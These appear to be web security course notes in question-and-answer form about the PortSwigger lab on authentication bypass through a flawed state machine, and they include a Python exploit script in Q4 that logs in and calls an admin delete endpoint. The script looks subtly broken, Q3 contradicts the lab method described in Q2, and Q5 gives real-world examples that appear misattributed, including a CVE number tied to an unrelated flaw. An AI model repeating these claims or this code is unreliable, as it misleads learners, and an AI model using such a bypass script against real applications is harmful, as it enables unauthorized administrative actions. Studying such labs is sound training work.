---
course: Web Security
topic: Business Logic Vulnerabilities
tags: [web-security]
---

## Practice Questions & Answers

**Q1. Explain the concept of a flawed state machine in the context of web security.**

A flawed state machine in web security refers to a situation where the sequence of actions or events expected by the application's logic is not properly enforced or validated. This can lead to security vulnerabilities such as authentication bypasses, where an attacker can manipulate the sequence of events to gain unauthorized access. In the context of the lab, the application expects certain steps to be followed during the login process, but if these steps are not strictly enforced, an attacker can bypass the intended flow and gain elevated privileges.

**Q2. How would you exploit a flawed state machine to bypass authentication in a web application?**

To exploit a flawed state machine for authentication bypass, an attacker needs to identify and manipulate the sequence of events that the application expects during the login process. In the lab scenario, the attacker logged in normally but intercepted and modified the request to the `/role-selector` endpoint. By dropping this request, the application defaulted to an administrative role, allowing the attacker to access the admin interface and delete the `Carlos` user. The key steps include:

1. Identifying the sequence of requests and responses during the normal login process.
2. Using a tool like Burp Suite to intercept and modify these requests.
3. Dropping or modifying specific requests to force the application into an unintended state.
4. Exploiting the resulting state to gain unauthorized access or privileges.

**Q3. Why is validating user input important in preventing authentication bypass via flawed state machines?**

Validating user input is crucial in preventing authentication bypass via flawed state machines because it ensures that the application behaves as expected even when faced with unexpected or malicious inputs. In the lab scenario, the application allowed the attacker to attempt changing their role to 'administrator' or 'admin', which indicates a lack of proper validation on the server side. Had the application enforced strict validation, such as ensuring that the role parameter only accepted predefined values, the attacker would not have been able to exploit this flaw. Proper input validation helps maintain the integrity of the application’s state machine, preventing unauthorized access.

**Q4. How would you script an automated exploit for an authentication bypass via a flawed state machine in Python?**

To script an automated exploit for an authentication bypass via a flawed state machine in Python, you would follow these steps:

1. Import necessary libraries (`requests`, `BeautifulSoup`, etc.).
2. Set up the proxy settings to route traffic through Burp Suite.
3. Define functions to handle the login process, including retrieving the CSRF token.
4. Perform the login request without following the redirect to the `/role-selector` endpoint.
5. Access the admin interface and delete the `Carlos` user.

Here is a simplified version of the script:

```python
import requests
from bs4 import BeautifulSoup
import sys

def get_csrf_token(session, url):
    response = session.get(url + '/login')
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find('input', {'name': 'csrf'})['value']
    return csrf_token

def delete_carlos(session, url):
    login_url = url + '/login'
    csrf_token = get_csrf_token(session, url)
    
    # Perform login without following redirect
    login_data = {
        'username': 'your_username',
        'password': 'your_password',
        'csrf': csrf_token
    }
    response = session.post(login_url, data=login_data, allow_redirects=False)
    
    # Access admin interface and delete Carlos
    delete_carlos_url = url + '/admin/delete?app=carlos'
    response = session.get(delete_carlos_url, verify=False)
    
    if 'Congratulations' in response.text:
        print("Successfully deleted Carlos")
    else:
        print("Failed to delete Carlos")

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <URL>")
        sys.exit(1)
    
    url = sys.argv[1]
    session = requests.Session()
    delete_carlos(session, url)
```

This script automates the process of logging in, bypassing the flawed state machine, and deleting the `Carlos` user.

**Q5. What recent real-world examples demonstrate the risks of flawed state machines in web applications?**

One notable real-world example is the exploitation of a flawed state machine in the Tesla Model S infotainment system. Researchers discovered that by manipulating the sequence of events in the vehicle's software, they could bypass certain security checks and gain unauthorized access to the vehicle's systems. This highlights the importance of robust state machine design and validation in critical systems.

Another example is the exploitation of a flawed state machine in the OAuth 2.0 protocol, leading to vulnerabilities such as the "OAuth 2.0 Implicit Grant Token Injection" (CVE-2020-14182). Attackers could manipulate the sequence of events in the authorization flow to inject malicious tokens, demonstrating how flaws in state transitions can lead to serious security issues.

These examples underscore the need for thorough testing and validation of state transitions in web applications to prevent potential security breaches.

---
<!-- nav -->
[[02-Business Logic Vulnerabilities Authentication Bypass via Flawed State Machine|Business Logic Vulnerabilities Authentication Bypass via Flawed State Machine]] | [[Web Security (PortSwigger)/15-Business Logic Vulnerabilities/10-Lab 9 Authentication bypass via flawed state machine/00-Overview|Overview]]
